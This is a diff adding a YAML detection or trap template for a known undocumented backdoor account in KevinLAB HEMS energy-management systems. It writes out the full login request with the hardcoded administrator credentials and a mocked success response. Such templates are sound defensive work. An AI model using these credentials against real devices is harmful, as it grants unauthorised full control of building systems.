@@ -1,0 +1,35 @@
+id: kevinlab-hems-backdoor
+info:
+  name: KevinLAB HEMS - Backdoor Detection
+  author: gy741
+  description: 'KevinLAB HEMS has an undocumented backdoor account and these sets
+    of credentials are never exposed to the end-user and cannot be changed through
+    any normal operation of the solution through the RMI. An attacker could exploit
+    this vulnerability by logging in using the backdoor account with highest privileges
+    for administration and gain full system control. The backdoor user cannot be seen
+    in the users settings in the admin panel and it also uses an undocumented privilege
+    level (admin_pk=1) which allows full availability of the features that the HEMS
+    is offering remotely.
+
+    '
+  severity: critical
+  reference:
+  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php
+  metadata:
+    max-request: 1
+  tags: kevinlab,default-login,backdoor
+traps:
+- request:
+    method: POST
+    path: /dashboard/proc.php?type=login
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      Accept-Encoding: gzip, deflate
+      Connection: close
+    body: 'userid=kevinlab&userpass=kevin003
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: <meta http-equiv="refresh" content="0; url=/"></meta><script> alert
